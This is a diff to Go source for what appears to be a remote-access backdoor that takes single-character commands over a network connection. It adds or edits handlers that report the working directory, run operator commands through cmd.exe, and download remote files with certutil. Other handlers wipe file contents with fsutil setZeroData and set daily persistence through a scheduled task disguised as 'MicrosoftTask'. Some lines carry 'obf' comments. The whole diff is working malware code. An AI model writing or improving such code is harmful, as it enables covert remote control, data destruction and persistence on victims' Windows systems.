@@ -27,6 +27,10 @@ func main () {
 					break
 				}
 				for {
+					if (data == "b" || data[0] == 98) {
+						dir,_ := os.Getwd()
+						fmt.Fprintf(connection, dir + "\n")
+					}
 					if (data == "a" || data[0] == 97) {
 						data,_ := bufio.NewReader(connection).ReadString('\n')
 						h := "/c " + string(data)
@@ -49,21 +53,22 @@ func main () {
 					}
 					if (data == "7" || data[0] == 55) {
 						url,_ := bufio.NewReader(connection).ReadString('\n')
-						filename,_ := bufio.NewReader(connection).ReadString('\n')
-						k := exec.Command("cmd.exe","/c","certutil.exe","-urlcache","-split","-f",string(url),string(filename)) // obf
+						url = strings.Replace(url, "\n", "", -1)
+						k := exec.Command("certutil.exe","-urlcache","-split","-f",string(url)) // obf
 						ktwo,_ := k.Output()
 						fmt.Fprintf(connection, string(ktwo) + "\n")
 						
 					}
 					if (data == "6" || data[0] == 54) { // option 6 aka file deletion
 						filename,_ := bufio.NewReader(connection).ReadString('\n')
-						k := exec.Command("cmd.exe","/c","fsutil.exe","file","setZeroData","offset=0","length=9999999999",filename) // obf
+						filename = strings.Replace(filename, "\n", "", -1)
+						k := exec.Command("fsutil.exe","file","setZeroData","offset=0","length=9999999999",filename) // obf
 						ktwo,_ := k.Output()
 						fmt.Fprintf(connection, string(ktwo) + "\n")
 					}
 					if (data == "5" || data[0] == 53) { // option 5 aka maintain access via schtasks
 						_, filename, _, _ := runtime.Caller(1)
-						k := exec.Command("cmd.exe","/c","schtasks","/create","/tn","MicrosoftTask","/tr",filename,"/sc","daily") // obf
+						k := exec.Command("schtasks","/create","/tn","MicrosoftTask","/tr",filename,"/sc","daily") // obf
 						ktwo,_ := k.Output()
 						fmt.Fprintf(connection, string(ktwo) + "\n")
 					}
